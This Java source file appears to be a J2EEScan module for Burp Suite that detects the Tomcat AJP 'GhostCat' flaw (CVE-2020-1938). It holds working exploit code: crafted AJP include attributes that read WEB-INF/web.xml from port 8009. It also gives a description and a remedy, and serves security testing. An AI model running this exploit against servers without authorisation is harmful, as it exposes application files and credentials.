package burp.j2ee.issues.impl;

import burp.CustomHttpRequestResponse;
import static burp.HTTPMatcher.getApplicationContext;
import static burp.HTTPMatcher.getMatches;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import burp.j2ee.lib.SimpleAjpClient;
import burp.j2ee.lib.TesterAjpMessage;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import static burp.J2EELocalAssessment.analyzeWEBXML;
import burp.j2ee.annotation.RunOnlyOnce;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * AJP Tomcat GhostCat - CVE-2020-1938
 *
 *
 *
 * References: - AJP Bug Implementation credits: -
 * https://github.com/threedr3am/learnjavabug/tree/master/tomcat/ajp-bug/src/main/java/com/threedr3am/bug/tomcat/ajp
 *
 *
 * TODO: 
 * - Hardcoded AJP port 8009 
 *
 */
public class AJP_Tomcat_GhostCat implements IModule {

    private static final String TITLE = "AJP Tomcat GhostCat - CVE-2020-1938";
    private static final String DESCRIPTION = "J2EEScan identified a file inclusion vulnerability in the AJP connector in Apache Tomcat. <br />"
            + "A remote unauthenticated attacker could read web application files from the remote server. <br />"
            + "This check was able to retrieve the remote <code>WEB-INF/web.xml</code> file.<br /><br />"
            + "In instances where the vulnerable server allows file uploads, an attacker could upload malicious JavaServer "
            + "Pages (JSP) code within a variety of file types and trigger this vulnerability to gain remote code execution (RCE)."
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "https://access.redhat.com/solutions/4851251<br />"
            + "https://access.redhat.com/security/cve/CVE-2020-1938<br />"
            + "https://access.redhat.com/security/cve/CVE-2020-1745<br />";

    private static final String REMEDY = "<ul><li>Remove direct access to the AJP service</li>"
            + "<li>Configure <code>requiredSecret</code> for the AJPConnector to set the AJP protocol authentication credentials</li>"
            + "</ul>";

    private static final byte[] GREP_STRING = "<web-app".getBytes();

    private PrintWriter stderr;
    private PrintWriter stdout;

    @RunOnlyOnce
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        stderr = new PrintWriter(callbacks.getStderr(), true);
        stdout = new PrintWriter(callbacks.getStdout(), true);

        IExtensionHelpers helpers = callbacks.getHelpers();

        IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
        String host = url.getHost();
        int DEFAULT_AJP_PORT = 8009;

        List<IScanIssue> issues = new ArrayList<>();
        
        

        /**
         * Attempt on the application context
         */
        String contextPath = getApplicationContext(url);

        List<String> WEBINF_PATHS = Arrays.asList(
                "/" + contextPath + "/WEB-INF/web.xml",
                "WEB-INF/web.xml"
        );

        SimpleAjpClient ac = new SimpleAjpClient();
        String uri = "/xxxxxxxxxxxxxxxest.xxx";
        String ajp_forward_result = "";

        for (String WEBINF_PATH : WEBINF_PATHS) {

            stdout.println("Testing AJP GhostCat on path_info " + WEBINF_PATH);
            
            try {

                ac.connect(host, DEFAULT_AJP_PORT);

                TesterAjpMessage forwardMessage = ac.createForwardMessage(uri);
                forwardMessage.addAttribute("javax.servlet.include.request_uri", "1");
                forwardMessage.addAttribute("javax.servlet.include.path_info", WEBINF_PATH);
                forwardMessage.addAttribute("javax.servlet.include.servlet_path", "");

                forwardMessage.end();

                ac.sendMessage(forwardMessage);

                while (true) {
                    byte[] responseBody = ac.readMessage();
                    if (responseBody == null || responseBody.length == 0) {
                        break;
                    }
                    ajp_forward_result += new String(responseBody);

                    // look for matches of our active check grep string List<int[]>
                    List<int[]> matches = getMatches(ajp_forward_result.getBytes(), GREP_STRING, helpers);

                    if (matches.size() > 0) {

                        try {
                            issues.add(new CustomScanIssue(
                                    baseRequestResponse.getHttpService(),
                                    new URL(url.getProtocol(), url.getHost(), DEFAULT_AJP_PORT, "AJP_TCP_" + DEFAULT_AJP_PORT),
                                    new CustomHttpRequestResponse("<REDACTED>".getBytes(), ajp_forward_result.getBytes(),
                                            baseRequestResponse.getHttpService()),
                                    TITLE,
                                    DESCRIPTION,
                                    REMEDY,
                                    Risk.High,
                                    Confidence.Certain));
                            
                            // Analyze the web.xml file to identify potential security configuration issues
                            analyzeWEBXML(ajp_forward_result.getBytes(), callbacks, baseRequestResponse);  
                            
                        } catch (MalformedURLException ex) {
                            stderr.println(ex);
                            
                        } catch (Exception ex) {
                            stderr.println("AJP Tomcat GhostCat error: " + ex);
                        }
                        
                        return issues;
                    }
                }

                ac.disconnect();

            } catch (IOException ex) {
                stderr.println("AJP Tomcat GhostCat error: " + ex);
            }
        }

        return issues;

    }

}
